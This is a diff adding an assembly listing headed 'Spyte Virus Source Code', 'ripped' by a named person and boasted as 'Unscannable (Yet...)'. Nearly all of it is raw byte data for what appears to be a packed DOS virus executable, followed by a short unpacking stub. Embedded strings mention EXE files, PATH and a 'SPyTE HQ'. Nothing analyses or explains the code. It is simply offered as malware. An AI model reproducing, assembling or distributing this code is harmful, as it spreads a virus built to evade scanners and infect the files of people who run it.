@@ -1,0 +1,304 @@
+ีออออออออออออออออออออออออออออออออออออออออออออออออออธ
+ณ Spyte Virus Source Code                          ณ
+ณ Ripped by : The Head Hunter [FS]                ณ
+ณ                                                  ณ
+ณ Unscannable (Yet...)                             ณ
+ณ                                                  ณ
+ิออออออออออออออออออออออออออออออออออออออออออออออออออพ
+ db     ff,c3,55,89,e5,a1,d4,02,05,96,00,a3,fa,ff,f0,7f,36,fc,9a,c6
+ db     02,4e,00,b8,0a,00,50,9a,9e,7c,fc,f7,89,ec,5d,cb,de,0e,e8,d7
+ db     ff,ff,87,1e,c5,b6,0c,00,c4,be,08,00,8b,8e,06,fc,ff,ff,d7,33
+ db     c0,fc,ac,3c,1b,75,05,80,f4,80,eb,4d,3c,10,ff,ff,73,07,80,e4
+ db     70,0a,e0,eb,42,3c,18,74,13,73,19,2c,0b,f1,10,02,c0,fe,fc,e9
+ db     8f,e9,2b,81,e1,ff,c2,a0,cb,fa,eb,23,3c,19,75,0b,ac,51,32,ff
+ db     9f,ed,8a,c8,b0,20,eb,0d,90,3c,1a,75,0f,ac,49,ff,7f,f0,ac,e3
+ db     03,ab,e2,fd,59,49,ab,e3,02,e2,a5,1f,0c,ff,87,ca,7b,08,34,30
+ db     '0 Me'
+ db     f0,ff,67,a2
+ db     'Running5c:\x'
+ db     9f,3b,fc,42,42,53,f9,fd,5c,4c,53,44,a8,28,f5,f9,64,e7,fc,f9
+ db     f2,f8,09,7d,fc,f5,04
+ db     'PATH9'
+ db     81,ec,68,02,ff,c7,c4,7e,0e,06,57,8d,7e,f0,16,57,b8,0f,1b,7f
+ db     8c,2b,03,b0,00,bf,9d,00,0e,ed,9e,85,77,ed,50,ed,fd,0f,e6,fe
+ db     bf,a6,e9,f8,10,bf,ae,1f,18,ed,f8,10,8d,be,98,fd,f1,af,53,18
+ db     f5,fe,f5,98,fb,bf,e4,c7,87,d7,9a,11,e0,9a,69,00,40,fb,08,41
+ db     00,fb,86,0a,86,c8,ff,fc,21,f2,26,80,3d,00,75,23,ca,9e,13,09
+ db     ca,bf,a6,d4,f8,12,1b,fe,72,58,fe,d0,fe,09,f7,06,26,c6,05,00
+ db     eb,76,1e,07,f7,fc,01,d6,f2,0c,00,22,62,06,a9,a7,ec,22,ae,5f
+ db     f8,0a,9a,9f,05,be,61,42,16,fe,97,2e,ff,9c,e3,48,34,e7,08,46
+ db     f0,b8,10,c6,d3,d8,59,f1,9a,0e,02,d8,ee,ff,e8,fd,c6,86,b3,f9
+ db     01,eb,04,fe,f9,dd,fc,9a,85,f8,f3,09,e1,fd,d6,18,b3,40,31,d2
+ db     bf,03,89,86,ae,f9,89,96,b0,df,fd,ff,b6,f6,c0,0a,fc,ee,9a,ac
+ db     d7,fe,94,fd,31,de,25,f9,c1,0e,ea,83,c4,04,e7,f8,0a,f8,70,c4
+ db     c1,8c,c2,2d,01,e9,da,00,52,b0,f0,ab,c9,f8,15,15,c9,f8,0a,68
+ db     56,fd,80,f0,db,be,6f,05,74,03,e9,65,ff,69,fd,da,4a,f8,09,fd
+ db     7f,38,fd,f9,f2,04,00,02,4c,53,02,44,2e,03,45,58,45,ff,2b,ef
+ db     f3,56,01,c6,46,ad,00,bf,ce,02,4a,f2,eb,f0,0b,0c,d5,ce,06,fd
+ db     ba,aa,87,f3,f0,f2,56,f2,71,b5,bf,d1,d9,9a,9e,2c,f2,d4,f8,0c
+ db     d8,f8,10,d4,10,60,d8,f8,0c,fb,ad,fb,b0,9f,fd,38,9c,fc,b2,fc
+ db     80,f3,00,74,32,61,ff,e8,f1,6a,fe,a6,e1,3d,64,00,7c,1f,89,ff
+ db     ed,46,aa,eb,03,ff,4e,aa,ff,76,aa,a0,e4,05,a0,e5,83,bf,55,7e
+ db     aa,64,75,e6,eb,27,d7,f8,18,01,d7,f8,0c,71,e2,e0,e9,04,c0,09
+ db     fb,ec,1d,c3,c2,9a,c2,01,f8,31,c0,44,e1,91,34,3f,1c,fc,bf,02
+ db     00,1e,57,be,cb,8e,c6,bf,3c,0c,e0,c0,e9,96,02,50,e9,3f,fc,71
+ db     5e,fc,19,fc,ed,fe,d3,9a,f3,29,e4,18,e1,cb,9a,d8,b7,bb,8b,ec
+ db     ff,f7,1e,fc,c5,76,06,ac,8a,d8,32,ff,03,de,e1,e1,47,56,10,fe
+ db     1e,f0,0a,f0,c8,32,ed,f3,a4,32,ff,ff,c0,aa,4f,b8,00,43,c5,56
+ db     0e,42,cd,21,1f,5e,72,06,43,7a,f7,c1,18,1e,25,d9,3b,f3,74,1d
+ db     f8,87,e1,8a,e0,ac,3c,3b,74,05,aa,f2,3f,7c,75,f4,80,fc,3a,74
+ db     c2,fb,5c,74,bd,b0,5c,38,fe,38,b8,8b,c7,d9,2b,c7,48,aa,1f,d3
+ db     f9,5d,ca,08,97,83,ec,20,94,8d,7e,c3,ff,e0,16,07,c9,1f,76,02
+ db     b0,1f,98,8b,c8,40,87,f0,8b,d0,e3,0e,f1,61,a3,3c,7a,77,7f,f8
+ db     02,2c,20,aa,e2,f2,b0,3d,cb,1e,8e,1e,c8,f0,43,02,fc,2c,00,33
+ db     f6,80,3c,8c,11,fc,ff,ca,8b,ca,f3,a6,74,08,4e,ac,0a,c0,75,fb
+ db     1f,fe,eb,ea,8b,fe,1e,07,7f,b9,00,01,f2,ae,f6,1e,ae,d1,e0,e1
+ db     8a,c1,aa,4f,1f,8b,e5,f7,ea,fe,9d,ff,ff,db,f1,e8,2a,00,bf,ea
+ db     02,1e,6e,f1,1f,03,ef,14,f7,9a,1c,06,39,f1,ea,03,ed,0c,71,f4
+ db     ed,f7,9a,21,ed,a1,f2,b4,0f,ff,f0,e8,d3,05,3c,07,74,0a,3c,03
+ db     57,b8,03,00,e1,ff,e8,56,fd,a1,00,b4,08,32,ff,e8,bb,05,8a,ff
+ db     0f,c4,24,7f,a2,e6,02,a2,dc,02,33,c0,a2,d7,e1,ff,f8,e7,fd,e8
+ db     02,40,a2,d6,02,b8,40,00,8e,ff,c7,c0,bf,6c,00,26,8a,05,26,3a
+ db     05,74,fb,f8,21,fc,b9,ff,ce,3f,e7,37,00,91,f7,d0,1f,fe,33,d2
+ db     f7,f1,a3,e2,86,0e,1f,ba,2f,01,b8,1d,ff,1b,25,b5,f1,c3,ba,cd
+ db     c2,26,80,26,87,00,08,7f,fe,91,05,04,72,02,b0,03,50,b4,f8,3f
+ db     92,54,05,58,0a,e4,74,2d,b8,12,11,b3,fc,c3,f3,47,05,b8,30,11
+ db     b7,00,b2,f6,3d,1f,02,05,80,fa,2a,75,16,ce,0e,ce,00,fc,bc,fd
+ db     08,06,e8,29,05,b4,3f,de,12,b3,20,e8,22,05,c3,49,1c,05,50,d4
+ db     fe,f0,0f,11,bd,b1,00,0a,d2,75,08,b2,18,ff,c3,39,77,02,b1,01
+ db     8a,f2,8a,d4,fe,ca,a3,80,ff,ff,fe,18,76,02,b4,01,a3,da,02,89
+ db     16,e4,02,88,0e,d9,1f,c6,02,c6,06,d8,02,01,32,a3,de,ee,ff,87
+ db     e0,02,c3,50,1e,b8,57,01,8e,d8,80,3e,2c,03,3c,00,74,05,e3,21
+ db     01,1f,58,cf,c0,53,f1,f8,00,75,01,c3,f0,00,18,00,c1,cd,16,50
+ db     b4,fe,ff,fa,eb,f4,b0,5e,e8,18,03,b0,43,e8,13,03,e8,09,ff,c3
+ db     03,cd,23,8b,dc,36,8b,47,04,e8,23,06,6e,0d,78,ff,a0,d8,f3,ca
+ db     d0,eb,8a,57,0a,18,86,fc,77,08,fc,4f,06,fc,ff,e1,6f,04,3a,d1
+ db     77,27,3a,f5,77,23,6e,78,1f,7f,f8,fe,ce,78,1b,fe,c9,3a,0e,72
+ db     77,13,fe,cd,43,c0,3a,2e,e5,f8,0b,76,72,00,85,0e,72,0c,03,c7
+ db     e9,14,c3,10,06,8a,3e,b6,8b,0e,eb,8b,0f,f0,5d,e8,34,04,f9,f5
+ db     e8,21,03,77,fa,cb,e8,16,03,e3,fe,ca,8a,e5,19,04,cb,b8,c3,9f
+ db     01,07,eb,ea,01,06,50,e8,f9,02,58,e2,f4,e5,8a,c8,8a,ee,c6,3a
+ db     ee,75,0f,8c,02,32,c0,e8,f4,c7
+ db     'mC<uw'
+ db     04,7d,02,b3,72,17,3a,0e,87,e0,77,11,73,02,36,df,f2,07,08,09
+ db     3a,36,e1,f2,2d,be,0f,87,41,04,00,e8,b1,c1,c2,2a,06,db,21,04
+ db     fe,c0,8f,a5,f4,c6,f4,40,82,dd,f4,bc,14,ff,e1,a8,f0,74,04,24
+ db     0f,0c,80,80,26,96,70,08,c2,4f,06,0f,ff,e6,24,07,b1,04,d2,e0
+ db     a5,87,e8,8f,e8,fd,f4,f7,cb,80,0e,fa,a5,ff,08,cb,e2,f4,bb,8b
+ db     57,04,0b,d2,74,13,33,7b,80,ff,8e,c7,ca,e9,8b,1e,e2,33,98,8f
+ db     c2,06,00,4a,75,f8,cd,b3,e9,4c,e2,e9,ff,f9,c3,d8,5f,04,b8,dd
+ db     34,ba,12,00,3b,d3,ff,ff,73,1a,f7,f3,8b,d8,e4,61,a8,03,75,08
+ db     0c,03,e6,61,ff,01,b0,b6,e6,43,8a,c3,e6,42,8a,c7,fc,61,80,cb
+ db     e7,24,fc,eb,97,ed,0f,3e,e7,4b,f1,08,51,f2,b0,00,74,02,b0,01
+ db     30,7a,8b,ef,c6,06,eb,c1,e1,12,32,e4,c0,c3,e9,f8,0a,88,26,ef
+ db     0a,10,c6,e4,9b,b0,11,18,fe,70,3f,84,1e,36,c5,7f,04,c7,45,f0
+ db     d7,fb,0f,3f,04,80,00,8d,85,fc,89,45,0c,8c,5d,0e,fc,5f,f1,10
+ db     59,03,8c,4d,12,c6,45,30,00,1f,e8,f1,7f,f8,d5,fd,b8,91,03,bb
+ db     6f,04,4d,81,7d,02,b1,e3,43,d7,74,0a,c6,b2,d7,b8,3e,ef,d8,08
+ db     0f,ca,14,d2,16,89,5d,18,0f,27,fa,1a,89,4d,1c,fa,1e,33,c0,c8
+ db     fd,00,f8,d9,46,ca,8b,55,04,4a,4a,fa,3f,ff,60,26,c4,7d,0c,33
+ db     db,68,0e,e8,5c,ff,b9,ff,ff,01,00,3c,08,74,34,3c,13,74,30,3c
+ db     04,74,44,49,3c,ff,ff,1b,74,27,3c,01,74,23,3c,06,74,37,3c,1a
+ db     74,46,3c,ff,ff,0d
+ db     'tO< r'
+ db     cf,3b,da,74,cb,26,88,01,43,e8,ff,ff,98,00,3b,de,76,c0,8b,f3
+ db     eb,bc,0b,db,74,b8,b0,08,3f,c0,e8,87,00,b0,20,e8,82,fb,f6,7d
+ db     1f,3e,00,4b,e2,ea,eb,a4,e0,74,a0,26,8a,01,fe,bf,ca,99,e8,6a
+ db     00,43,e2,ef,eb,91,80,3e,d7,e9,ff,20,e9,8a,bf,eb,0a,e8,4e,00
+ db     26,c7,01,0d,0a,11,02
+ db     'CCg[&F@'
+ db     0d,6b,48,0a,b9,da,88,f1,c4,10,c2,1c,59,4d,ee,29,fc,e3,04,ed
+ db     19,53,c4,d8,a8,f1,0b,53,f1,e8,ff,0f,1c,00,47,e2,f7,eb,03,e8
+ db     9c,00,e8,db,fc,c8,fb,c6,cf,fb,b0,0d,d9,e1,b0,0a,53,bd,31,51
+ db     52,79,e9,72,00,58,20,e1,2a,2b,2d,fe,3f,44,33,3c,0a,74,35,b4
+ db     09,8a,1e,dc,02,32,fd,bd,14,52,e8,65,01,5a,fe,c2,81,ea,76,20
+ db     8a,ff,01,75,e9,eb,17,b4,0e,e8,51,01,eb,13,ed,3e,10,f3,74,0d
+ db     fe,ca,eb,d3,e9,84,ff,9b,08,9b,2d,00,07,5a,59,5b,c3,fe,3e,68
+ db     c6,5f,ea,76,18,fe,ce,9e,15,e9,e2,e0,0c,16,78,78,b1,59,c3,b4
+ db     03,a3,e9,0c,01,b4,7c,c3,9c,e9,05,01,1e,62,da,d8,e2,50,1f,31
+ db     00,1f,8b,da,8b,f7,47,6f,21,26,dc
+ db     'o,sk9G~'
+ db     fd,c3,fc,3c,e8,6f,9b,a0,ff,8f,2c,e8,63,18,86,00,a1,07,72,c3
+ db     00,ad,cf,f1,eb,1c,e8,54,00,6d,13,6d,0f,e8,f0,a7,47,d8,78,ff
+ db     eb,07,e8,3f,00,d3,00,df,47,aa,a6,e2,a6,e8,31,00,94,fc,f8,ff
+ db     89,94,8a,c6,f6,26,4a,00,32,f6,03,c2,8b,00,0f,c8,84,b4,b0,0e
+ db     ee,eb,e3,29,eb,c5,42,fa,4a,b0,0f,f4,c1,fc,f0,f4,1f,c3,3b,f7
+ db     74,63,99,57,1e,06,87,07,8b,cf,2b,ce,b4,d9,02,8a,36,32,9e,ff
+ db     bb,8a,c7,bf,ff,03,c3,d1,e0,8b,88,ff,f8,46,bb,83,c2,06,b8,00
+ db     b8,80,ff,ff,3e,49,00,07,75,02,b4,b0,06,1f,8e,c0,fc,0a,db,74
+ db     fe,f8,16,42,c9,ec,a8,01,75,fb,fa,fa,74,fb,8b,ff,7f,c3,ab,fb
+ db     e2,ec,eb,06,8a,e7,ac,ab,e2,fc,07,1f,5f,ff,07,ed,f1,56,57,55
+ db     06,cd,10,07,5d,5f,5e,31,fb,ff,ff,f8,0b,ba,11,d9,da,8c,06,c8
+ db     02,33,ed,8b,c4,05,13,3f,fc,00,b1,04,d3,e8,8c,d2,4b,a3,a0,02
+ db     a3,a2,87,10,02,03,06,9a,f9,a4,fd,ae,fe,ff,fd,b2,02,26,a1,02
+ db     00,2d,00,10,a3,b6,02,bf,ea,ff,ff,04,be,dd,01,b9,12,00,90,fc
+ db     2e,ac,b4,35,cd,21,89,ff,d6,1d,8c,45,02,83,c7,04,e2,f0,1c,d2
+ db     ce,4c,d9,1c,d1,21,85,ba,d5,f8,23,f8,9d,f8,14,da,24,f8,c6,f8
+ db     3f,04,d2,b8,7b,c9,f0,0e,50,fe,b8,06,02,0e,5f,c1,28,05,43,e3
+ db     fc,94,05,ec,03,ec,f8,0a,14,ec,85,ff,ff,05,cb,fb,83,c4,06,58
+ db     83,e7,1f,81,c7,96,00,80,fc,ff,f0,39,73,03,bf,ff,ff,57,b4,54
+ db     bd,8b,ec,80,ff,bf,4e,16,01
+ db     'X[YZ^_]'
+ db     1f,07,cf,b8,d0,fd,ff,d5,b1,06,07,d9,c8,00,59,5b,eb,07,b8,ff
+ db     00,33,c9,33,fc,ff,db,24,fb,a3,c2,02,8b,c1,0b,c3,74,1f,a1,ff
+ db     3f,a6,02,0b,c0,74,11,8e,c0,26,3b,1e,10,00,74,06,fc,fd,30,14
+ db     00,eb,ed,8c,c3,2b,98,c1,83,eb,10,89,ff,8f,0e,c4,02,89,1e,c6
+ db     02,c4,1e,be,02,8c,c0,85,e1,cf,13,e9,c9,f5,a3,c0,fd,cc,02,c3
+ db     19,b8,12,01,68,06,53,cb,45,6a,1f,64,3d,50,fc,8b,b9,05,f4,f0
+ db     0d,25,1e,c5,15,1d,86,1e,f5,f2,f1,a1,b0,0b,06,b0,6f,f8,74,29
+ db     bb,ef,01,7c,c1,a1,78,e8,32,00,bb,10,e0,fe,f4,1e,f4,e9,e8,40
+ db     0f,30,00,b0,3a,e8,55,f5,da,e8,35,84,34,e9,03,fa,07,dd,b4,4c
+ db     3c,fc,c1,2e,8a,07,0a,57,06,e8,38,00,43,8f,fb,eb,f3,c3,b1,64
+ db     e6,b1,0a,ad,e1,eb,04,32,1f,3f,e4,f6,f1,04,30,50,be,58,8a,c4
+ db     c3,50,0c,3d,fc,e8,01,f6,50,97,d1,e8,e8,03,0c,ff,f7,24,0f,e4
+ db     3c,3a,72,02,04,07,8a,c3,ff,d0,b4,06,b8,c3,00,02,1b,23,24,34
+ db     35,36,ff,fd
+ db     '789:;<=>?u'
+ db     b8,99,74,69,6d,65,ff,c3
+ db     ' error '
+ db     00,20,61,74,fb,2e,1d,0e,0d,0a,48,e1,87,06,1a,cb,83,3e,0e,ff
+ db     fb,17,c9,cb,a1,f9,e9,b5,fe,8b,f4,36,8e,ff,e1,44,02,26,3b,55
+ db     02,7f,07,7c,14,f8,05,72,78,80,0f,f3,06,7c,08,f1,f8,c3,c7,45
+ db     04,77,d8,b8,c9,00,e9,8d,d8,1f,3e,2b,f0,72,0d,81,ee,91,72,07
+ db     3b,36,ca,60,08,fa,e7,ca,e7,74,fd,ff,e7,c8,49,e9,f0,8b,fa,f7
+ db     e1,50,52,8b,c6,f7,e3,8b,03,fc,d8,8b,c7,f4,ea,5a,58,03,d3,03
+ db     ff,ff,d1,cb,55,8b,e9,0b,eb,74,60,0b,db,9c,79,0a,f7,d1,ff,e9
+ db     f7,d3,83,c1,01,83,d3,00,0b,d2,f1,d0,f7,fd,7d,d2,05,e0,a1,d2
+ db     00,8b,f1,8b,fb,33,f2,bd,21,00,d1,f8,ff,ff,d3,2b,ce,1b,df,73
+ db     04,03,ce,13,df,f5,ff,85,d1,d0,d1,d2,4d,75,ea,9d,79,0f,c3,f8
+ db     09,f3,83,f7,05,eb,0d,fb,c0,f8,0a,5d,cb,5d,ea,e9,e9,e7,ff,07
+ db     fd,83,e1,1f,74,06,d1,ea,d1,d8,e2,fa,18,0e,08,f4,e0,c0,f4,fd
+ db     fd,90,7d,d1,f8,0a,cb,fc,8b,dc,8c,da,0a,d9,08,36,c5,77,bb,42
+ db     04,ac,aa,f9,ac,8e,da,29,d9,e6,fc,ea,0a,7c,78,e2,06,36,8b,4f
+ db     e2,3a,c1,76,02,ed,0b,8a,b1,dc,ff,0a,cf,d6,8a,05,32,e4,ce,ff
+ db     71,f1,ef,0c,ca,08,8a,42,f1,ca,06,0b,fb,27,c9,7f,03,06,d9,03
+ db     f1,2b,c1,72,13,40,b8,18,c2,ee,7d,02,1d,3b,b3,06,7b,2e,8b,c1
+ db     eb,a5,b1,aa,8b,c8,b1,08,bf,ff,43,f8,73,aa,0d,98,ac,26,00,05
+ db     0d,1f,73,08,07,99,ff,87,f6,d0,03,f9,47,54,c6,83,61,f8,09,6e
+ db     c9,9a,b9,7f,d5,7f,f8,e3,29,47,ac,3c,01,72,29,ed,ac,f2,ae,75
+ db     87,3f,1c,4f,eb,1f,7f,8b,d1,2b,d0,72,11,42,7e,c0,9f,a6,74,0e
+ db     2b,c8,7b,be,c3,ff,4a,75,f0,8c,eb,08,2b,f8,8b,c7,36,2b,47,15
+ db     c6,04,1f,88,ff,b3,fd,8d,8a,25,99,f1,e3,3a,cc,13,cc,0a,c9,74
+ db     06,12,a6,d7,5b,75,02,3a,c4,5d,fe,f0,f2,b0,01,aa,0a,c2,aa,80
+ db     c1,a3,68,4b,fe,0a,bf,d8,f1,eb,30,fd,06,ff,ea,03,ca,81,ec,00
+ db     02,8d,be,00,fa,92,1b,93,1e,a1,8b,5b,a1,46,06,48,b4,e1,d0,1b
+ db     91,63,89,f7,08,e5,06,1e,99,00,8c,99,df,ff,79,a9,ff,dc,58,29
+ db     ea,b1,fe,62,91,f8,8a,ec,08,ac,0e,f4,6f,fe,15,aa,05,91,ac,fc
+ db     83,7e,9b,2a,a1,7e,43,a6,f8,10,08,a6,76,03,91,af,ff,86,c6,ec
+ db     03,8f,50,ab,fc,5c,ab,9a,ad,99,ab,fc,ef,fc,19,aa,94,c9,4c,ec
+ db     e1,7e,fc,89,bc,a8,c1,04,92,f7,f3,92,25,e8,36,00,93,ff,ff,b8
+ db     80,00,b9,20,00,f6,c6,80,75,0a,d1,e3,d1,d2,fe,ff,f0,c8,e2,f3
+ db     32,c0,80,e6,7f,cb,c4,00,cd,3c,ff,87,9f,06,65,05,cd,37,06,ce
+ db     02,cd,35,e1,fd,ff,e1,fd,cd,39,d9,cd,3d,cb,e1,ff,a1,ef,8b,1e
+ db     f0,4f,d0,fc,c8,2e,f7,26,9d,05,d1,e1,3f,86,fe,02,e9,03,d1,03
+ db     d3,bc,e3,fa,1f,0c,02,f3,b1,05,d3,e3,fa,7b,ec,a3,c3,b7,d2,89
+ db     16,d2,c3,05,84,b4,2c,a3,d1,0e,ea,03,f1,fc,62,bb,f4,ed,92,c1
+ db     ab,b8,b0,d7,fc,44,f8,73,ab,f5,ff,8d,45,74,ab,38,c4,8c,ec,c1
+ db     06,f9,c8,ed,7f,ab,b9,0e,00,f3,ab,ac,3c,4f,9c,99,4f,35,9f,25
+ db     f2,35,c6,51,f3,0a,69,f2,17,c1,04,f8,06,f8,e8,ee,0c,f8,0b,c1
+ db     45,0e,01,c6,45,0a,33,e9,ba,1f,de,b1,d7,eb,08,ba,b2,fb,03,ba
+ db     b3,d7,f5,be,3b,1c,45,02,3d,17,b9,12,3d,e9,74,0d,3d,ee,f7,7e
+ db     74,10,c7,c7,d9,66,00,eb,24,52,45,f2,24,00,b4,5f,5a,bd,55,02
+ db     b9,fe,bb,10,00,e8,4a,93,d2,05,35,ac,b3,e3,ba,d5,74,b1,b2,fd
+ db     ca,b4,18,61,0a,f8,b0,08,b5,67,0f,d0,e0,18,50,bb,14,ca,fd,58
+ db     fa,d1,43,05,0c,bb,1c,f5,09,5f,b9,c1,fd,9b,b8,5d,fe,26,ff,19
+ db     37,d1,03,69,d1,5f,07,e5,a9,ff,7e,78,b3,33,c9,89,0d,b8,00,3d
+ db     af,fc,0d,b0,02,ff,05,84,3f,f5,4a,74,02,b4,3c,80,7d,30,fc,7f
+ db     7f,09,8d,55,30,cd,21,72,4f,89,05,b8,9d,07,d8,43,d3,8b,d9,d6
+ db     fc,29,8b,1d,ca,44,f8,7f,e7,b8,f2,07,8b,c8,8c,cb,f6,c2,80,75
+ db     11,fe,b3,c7,75,03,e8,26,00,b8,cd,d5,7e,b8,2b,b3,30,b5,4d,18
+ db     89,5d,1a,ef,1c,12,08,23,74,2e,b7,33,d2,db,b9,02,de,89,2d,80
+ db     43,78,2d,82,73,72,c0,eb,8b,ca,8b,d0,c2,05,a2,e9,8d,95,cc,e9
+ db     fd,18,fa,f2,b4,3f,f3,73,1e,e1,33,db,3b,c7,f0,d8,74,20,80,ec
+ db     1a,38,43,eb,f2,57,5a,8b,d3,2b,d0,cf,91,ba,fd,b1,b4,40,40,d1
+ db     bf,f2,0f,f4,04,26,c5,55,0c,7c,b1,83,f1,bf,72,0a,8b,10,a7,f2
+ db     99,f1,79,08,00,74,ab,61,61,f6,0a,f6,eb,ee,d0,f8,0a,bc,26,87
+ db     7d,58,4a,b1,b7,fc,72,07,2b,c1,98,b8,65,47,af,51,ff,db,f8,14
+ db     68,e0,fc,17,f4,1d,83,fb,04,76,06,55,fb,b4,3e,e6,fc,c7,ff,81
+ db     e8,0c,98,e9,16,98,e8,16,a0,d2,02,ef,05,b4,3d,33,d2,eb,4f,b9
+ db     3c,ba,01,09,ac,95,4d,ea,a4,f1,cc,e9,1a,f8,63,f1,0f,f3,c4,e9
+ db     '4~wP'
+ db     c3,eb,4c,00,5a,58,26,52,f3,12,1e,51,f1,06,1f,70,2f,60,b4,c1
+ db     73,06,17,f1,eb,11,92,fd,ea,40,ad,cc,05,05,d1,d9,45,ea,5d,b0
+ db     d9,8e,56,54,fc,d7,c1,75,0e,34,38,fc,73,e7,ea,38,ff,37,b1,5c
+ db     a9,75,17,33,fd,09,33,e1,f6,43,b1,ef,77,fd,06,86,ec,c3,b4,3f
+ db     ba,64,71,05,d8,ff,b9,ba,65,4e,fc,0a,e8,dc,ff,75,1b,1e,52,15
+ db     fe,c5,56,4d,a1,7e,f3,be,5a,1f,72,06,3b,c1,10,3d,74,78,c2,b6
+ db     da,a2,b3,3f,b9,dd,43,ca,b3,40,b9,ca,fd,10,e8,a6,ca,3f,e8,7f
+ db     58,0a,59,e9,1c,1e,51,26,f7,65,04,8b,c8,38,07,bd,0c,8a,e3,bf
+ db     59,bf,08,7b,25,d2,ea,75,04,8f,a1,8c,c2,0b,88,87,80,05,29,eb
+ db     1c,3b,cf,27,d4,74,17,89,0e,12,a6,e4,ff,af,e2,d0,50,05,98,0e
+ db     6e,fe,4a,a4,21,3b,d9,c5,a2,aa,fc,f3,f2,f7,03,93,e9,a4,ec,e2
+ db     92,eb,1e,3c,db,44,00,4e,c1,49,83,e1,37,f9,01,1d,33,db,0e,e8
+ db     8c,f8,2e,92,2d,7c,73,e9,13,8b,c1,8b,d3,e5,f8,0c,71,e5,12,f8
+ db     8f,e5,0b,2b,c1,1b,d3,72,05,b0,01,d5,05,f0,32,08,f4,1f,d2,d6
+ db     f4,75,2b,74,c1,45,8c,eb,96,01,96,52,50,f2,fe,49,ea,5b,40,aa
+ db     59,f0,ab,7a,fc,58,a1,ab,f4,fd,ff,f4,e2,f9,8b,a8,0a,16,0f,41
+ db     ' New Crac?'
+ db     fc
+ db     'k From.'
+ db     ff,0e,1a,3c,da,18,fd,21,1a,4f,fc,f8,0a,0c,da,0c,1a,09,b1,e8
+ db     04,c6,d8,f8,08,f8,07,f8,0b,f0,f8,0a,18,62,08,dc,0a,f4,b1,f5
+ db     09,84,66,f9,fa,03,f3,fc,06,f3,25,a6,fa,fc,ed,fd,f9,c7,f3,6c
+ db     51,05,f3,c2,f8,0a,0e,c8,f8,09,f9,ad,f8,0a,2c,14,f9,0f,d9,f8
+ db     14,fa,0b,da,f8,10,c1,b0,ee,d6,61,f8,09,da,ff,0c,b0,22,30,fa
+ db     fd,86,fe,d2,82,c3,54,15,d1,15,66,f8,09,e6,fc,d3,f8,12,a5,fe
+ db     d4,f8,0d,91,48,71,d4,d6,36,55,f8,11,45,54,ef,ff,d0,fd,67,d4
+ db     22,fd,e5,fd,55,e9,fc,f0,09,49,f8,0a,d3,f8,13,96,f7,66,f0,0b
+ db     fc,12,da,ff,bf,0f
+ db     'The Up and Com'
+ db     ff,e9
+ db     'cI Power In'
+ db     f0,70,75,b8,01,74,f4,50,69,1b,f1,79,bd,84,ff,d1,c5,f8,09,68
+ db     0b
+ db     'Doc Tol'
+ db     d3,ff,73,65,6e,59,0b
+ db     'Prof. FamHlk'
+ db     ef,fd,54,61,ac,4c,fc,64,1f,3e,65,0b,53,68,6f,6b,cf,72,65,61
+ db     74,6d,34,04,de,74,ed,fc,6e,93,4d,84,12,2e,d1,a9,fc,5a,0a,34
+ db     32,d2,44,0d,ff,1f,0a,43,b1
+ db     'l SPyTE'
+ db     ff,0f
+ db     ' HQ - (404) ?'
+ db     e1,c2,ff,2d,cd,3f,19,02,af,45,9c,53,10,b4,44,d1,0c,c0,eb,90
+ db     0c,ff,f8,2c,02,02,00,c5,f8,0c,00,f0,00,00,00,00,00,00,00,00
+ db     b1,03,00,00,00,40,ab,01,25,01,71,00,92,01
+ PUSH   ES
+ PUSH   CS
+ POP    DS
+ MOV    CX, WORD PTR [Data0]
+ MOV    SI, CX
+ DEC    SI
+ MOV    DI, SI
+ MOV    BX, DS
+ ADD    BX, WORD PTR [Data1]
+ MOV    ES, BX
+ STD
+ REPNZ
+ MOVSB
+ PUSH   BX
+ MOV    AX, 002bh
+ PUSH   AX
+ RETF
+ db     2e,8b,2e,08,00,8c,da,89,e8,3d,00,10,76,03,b8,00,10,29,c5,29
+ db     c2,29,c3,8e,da,8e,c3,b1,03,d3,e0,89,c1,d1,e0,48,48,8b,f0,8b
+ db     f8,f3,a5,09,ed,75,d8,fc,8e,c2,8e,db,31,f6,31,ff,ba,10,00,ad
+ db     89,c5,d1,ed,4a,75,05,ad,89,c5,b2,10,73,03,a4,eb,f1,31,c9,d1
+ db     ed,4a,75,05,ad,89,c5,b2,10,72,22,d1,ed,4a,75,05,ad,89,c5,b2
+ db     10,d1,d1,d1,ed,4a,75,05,ad,89,c5,b2,10,d1,d1,41,41,ac,b7,ff
+ db     8a,d8,e9,13,00,ad,8b,d8,b1,03,d2,ef,80,cf,e0,80,e4,07,74,0c
+ db     88,e1,41,41,26,8a,01,aa,e2,fa,eb,a6,ac,08,c0,74,34,3c,01,74
+ db     05,88,c1,41,eb,ea,89,fb,83,e7,0f,81,c7,00,20,b1,04,d3,eb,8c
+ db     c0,01,d8,2d,00,02,8e,c0,89,f3,83,e6,0f,d3,eb,8c,d8,01,d8,8e
+ db     d8,e9,72,ff
+ db     '*FAB*'
+ db     0e,1f,be,58,01,5b,83,c3,10,89,da,31,ff,ac,08,c0,74,16,b4,00
+ db     01,c7,8b,c7,83,e7,0f,b1,04,d3,e8,01,c2,8e,c2,26,01,1d,eb,e5
+ db     ad,09,c0,75,08,81,c2,ff,0f,8e,c2,eb,d8,3d,01,00,75,da,8b,c3
+ db     8b,3e,04,00,8b,36,06,00,01,c6,01,06,02,00,2d,10,00,8e,d8,8e
+ db     c0,31,db,fa,8e,d6,8b,e7,fb,2e,ff,2f,13,09,e5,13,17,13,20,05
+ db     05,0e,1e,0e,3d,05,14,0f,05,1a,05,06,1e,05,11,08,19,05,11,08
+ db     19,05,32,14,0a,0e,10,0a,39,09,20,09,0f,05,08,2d,05,0a,fa,13
+ db     00,08,01,00,ef,04,dc,00,01,00
+
+
